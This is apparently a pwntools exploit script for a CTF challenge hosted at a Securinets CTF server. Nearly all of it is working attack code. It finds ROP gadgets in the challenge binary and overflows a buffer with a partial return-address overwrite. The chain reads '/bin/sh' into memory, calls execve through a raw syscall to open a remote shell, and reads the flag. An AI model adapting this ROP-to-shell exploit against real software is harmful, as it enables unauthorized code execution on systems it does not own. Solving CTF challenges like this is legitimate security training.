from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# p=process('./main')
p = remote("pwn.ctf.securinets.tn",7777)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
# gdb.attach(p)
def cmd(c):
    sla(b"t\n",str(c).encode())
def name(s):
    cmd(1)
    sa(b":\n",s)
def desc(s):
    cmd(2)
    sa(b":\n",s)
bss = 0x004a8000
rop = ROP(ELF("./main"))
rdi = rop.find_gadget(['pop rdi','ret'])[0]
rax = rop.find_gadget(['pop rax','ret'])[0]
rdx = rop.find_gadget(['pop rdx','pop rbx','ret'])[0]
rsi = rop.find_gadget(['pop rsi','ret'])[0]
readinput = 0x401767
syscall = 0x4121e2
payload = flat([rdi,bss-0x400,rsi,0x400,readinput,
                rax,0x3b,rdi,bss-0x400,rsi,0,rdx,0,0,syscall])
payload = payload.ljust(0x90,b'\0')+b'\x38'
p.send(b"2\n")
p.send(payload)
p.send(b"3\n")
p.send(b"/bin/sh\0\n")
p.sendline("cat flag*")
p.interactive()
